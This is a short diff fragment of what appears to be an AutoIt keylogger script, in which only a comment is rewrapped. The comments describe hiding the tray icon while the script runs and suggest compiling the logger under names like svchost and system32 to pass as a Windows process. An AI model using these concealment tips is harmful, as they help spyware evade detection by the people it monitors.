@@ -32,5 +32,5 @@ WEnd                                                            ; Ends the While
                                                                
                                                                 ; Another change was adding the include "#NoTrayIcon" which prevents the AutoIT tray icon
                                                                 ; from appearing while the script is running. 
-                                                                ; Suggested compiled names include svchost, svchost64, and system32 (if you need to remember 
-                                                                ; which process is the logger).
+                                                                ; Suggested compiled names include svchost, svchost64, and system32 (if you need to  
+                                                                ; remember which process is the logger).
